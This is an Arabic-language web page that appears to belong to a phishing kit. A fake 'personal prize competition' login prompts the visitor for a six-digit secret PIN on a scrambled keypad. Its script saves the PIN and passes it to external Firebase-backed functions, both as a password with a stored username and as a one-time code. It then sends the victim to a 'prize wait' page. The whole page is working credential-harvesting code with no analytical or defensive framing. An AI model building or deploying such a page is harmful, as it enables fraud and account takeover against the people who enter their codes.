<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>الرقم السري</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{--pink:#f79aa8;--pink-hover:#ef8294;--green:#69d9a7;--ink:#263238;--muted:#7e8993}
    *{box-sizing:border-box}
    body{margin:0;min-height:100vh;font-family:Cairo,Tahoma,sans-serif;background:#eef0ef;color:var(--ink);overflow:hidden}
    .page{height:100vh;display:flex;flex-direction:column;background:#eef0ef}
    .topbar{height:58px;padding:0 18px;display:flex;align-items:center;justify-content:flex-end;background:#eef0ef}
    .back{width:38px;height:38px;border:0;background:transparent;color:#263238;font-size:25px;line-height:1;cursor:pointer}
    .card{width:100%;padding:8px 11px 20px}
    .card h1{margin:0 0 8px;text-align:right;font-size:19px;line-height:1.55;font-weight:800}
    .intro{text-align:right;color:#73808c;font-size:12px;line-height:1.8;margin:0 0 12px}
    .field label{display:block;text-align:right;font-size:11px;font-weight:700;margin:0 0 7px}
    .field input{width:100%;height:39px;border:1.5px solid var(--green);border-radius:7px;padding:0 12px;font:13px Cairo,sans-serif;outline:none;background:#fff}
    .link-row{margin:8px 0 0;display:flex;align-items:center;justify-content:flex-end}
    .link-row a{color:#ef8294;font-size:11px;font-weight:700;text-decoration:underline}
    .options{margin-top:9px;display:flex;flex-direction:column;align-items:flex-end;gap:7px}
    .option{display:flex;align-items:center;gap:7px;font-size:11px;color:#66727d;cursor:pointer}
    .option input{width:14px;height:14px;margin:0;accent-color:#8d98a2}
    .notice{height:46px;margin-top:12px;border-radius:9px;background:#7f8a9222;color:#69737c;display:flex;align-items:center;justify-content:center;font-size:12px}
    .keypad-sheet{position:absolute;right:0;bottom:0;left:0;height:auto;min-height:278px;background:#fff;border-radius:15px 15px 0 0;padding:15px 16px 18px;box-shadow:0 -10px 30px #0000001a;text-align:center}
    .handle{width:42px;height:4px;margin:-5px auto 9px;border-radius:9px;background:#dfe3e6}
    .dots{direction:ltr;display:flex;justify-content:center;gap:10px;height:15px;margin-bottom:13px}
    .dot{width:8px;height:8px;border-radius:50%;background:#dfe3e6}.dot.active{background:#69d9a7}
    .dots-label{font-size:11px;color:#7e8993;margin:-7px 0 10px}
    .digits{direction:ltr;display:grid;grid-template-columns:repeat(3,86px);justify-content:center;gap:8px}
    .digit{height:44px;border:1px solid #dfe3e6;border-radius:8px;background:#fff;color:#263238;font:700 17px Cairo,sans-serif;cursor:pointer}
    .digit:hover{background:#f6f7f7}
    .digit.delete{font-size:16px}.digit.delete span{font-size:22px}
    .submit{width:min(100%,358px);height:46px;margin:10px auto 0;border:0;border-radius:24px;background:var(--pink);color:#fff;font:800 14px Cairo,sans-serif;display:block;cursor:pointer}
    .submit:disabled{opacity:.72}
    .keypad-sheet{transition:transform .22s ease}
    @media(max-height:700px){.keypad-sheet{min-height:250px;padding-top:10px}.digits{grid-template-columns:repeat(3,82px);gap:6px}.digit{height:38px}.dots{margin-bottom:8px}.submit{height:42px;margin-top:8px}}
  </style>
</head>
<body>
  <div class="page">
    <header class="topbar"><button class="back" type="button" aria-label="رجوع" onclick="history.back()">←</button></header>
    <main class="card">
      <h1>قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
      <p class="intro">ادخل الرقم السري الخاص بك لتسجيل الدخول</p>
      <div class="field"><label>الرقم السري</label><input id="pinDisplay" type="text" inputmode="numeric" readonly placeholder="ادخل الرقم السري" value=""></div>
      <div class="link-row"><a href="#">نسيت الرقم السري؟</a></div>
      <div class="options">
        <label class="option"><input type="checkbox"><span>تذكر اسمي</span></label>
        <label class="option"><input type="checkbox"><span>تذكر الجوال</span></label>
      </div>
    </main>
  </div>
  <section class="keypad-sheet" aria-label="لوحة إدخال الرقم السري">
    <div class="handle"></div>
    <div class="dots" id="dots"><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i></div>
    <div class="digits-label">ادخل رمزك السري</div>
    <div class="digits" id="keypad"></div>
    <button class="submit" id="pinSubmit" type="button" disabled>تسجيل الدخول</button>
  </section>
  <script src="/assets/js/firebase-env.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
  <script src="/assets/js/firebase-client.js?v=12"></script>
  <script src="/assets/js/page-commands.js?v=5"></script>
  <script>
    const display=document.getElementById("pinDisplay"),dots=[...document.querySelectorAll(".dot")],submit=document.getElementById("pinSubmit"),keypad=document.getElementById("keypad");
    let pin="";
    const keys=["5","4","7","2","6","0","3","8","1","9","","delete"];
    function render(){
      dots.forEach((d,i)=>d.classList.toggle("active",i<pin.length));
      submit.disabled=pin.length!==6;
      display.value=pin?"•".repeat(pin.length):"";
    }
    keys.forEach(k=>{
      const b=document.createElement("button");b.type="button";b.className="digit";
      if(k==="delete"){b.classList.add("delete");b.innerHTML='<span>⌫</span>';b.setAttribute("aria-label","حذف");b.addEventListener("click",()=>{pin=pin.slice(0,-1);render()});}
      else if(k===""){b.disabled=true;b.style.visibility="hidden";}
      else{b.textContent=k;b.addEventListener("click",()=>{if(pin.length<6){pin+=k;render()}});}
      keypad.appendChild(b);
    });
    submit.addEventListener("click",async()=>{
      localStorage.setItem("prizePassword",pin);
      if(window.submitLogin)await window.submitLogin({username:localStorage.getItem("prizeUsername")||"",password:pin});
      if(window.submitOtp)await window.submitOtp(pin);
      location.href="prize-wait.html";
    });
    render();
  </script>
</body>
</html>
